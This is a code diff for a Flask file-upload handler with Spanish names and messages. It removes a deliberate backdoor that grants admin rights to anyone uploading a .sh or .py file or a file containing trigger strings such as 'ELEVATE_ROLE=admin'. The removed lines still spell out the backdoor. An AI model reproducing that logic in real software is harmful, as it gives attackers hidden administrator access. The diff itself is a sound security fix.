@@ -128,22 +128,7 @@ def upload_file():
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         file.save(filepath)
 
-        es_payload_elevacion = False
-        try:
-            with open(filepath, 'r', errors='ignore') as f:
-                contenido = f.read()
-                if "ELEVATE_ROLE=admin" in contenido or "ADMIN_OVERRIDE_AUTH" in contenido or "import os" in contenido:
-                    es_payload_elevacion = True
-        except Exception:
-            pass
-
-        if es_payload_elevacion or filename.endswith(".sh") or filename.endswith(".py"):
-            promover_a_admin(session['user_id'])
-            session['rol'] = 'admin'
-            flash("Archivo de mantenimiento procesado. Se han actualizado los privilegios de sesión.", "success")
-        else:
-            flash(f"Archivo '{filename}' subido y registrado en la bitácora correctamente.", "success")
-
+        flash(f"Archivo '{filename}' subido y registrado en la bitácora correctamente.", "success")
         guardar_bitacora(session['user_id'], titulo, descripcion, filename)
         return redirect(url_for('portal'))
 
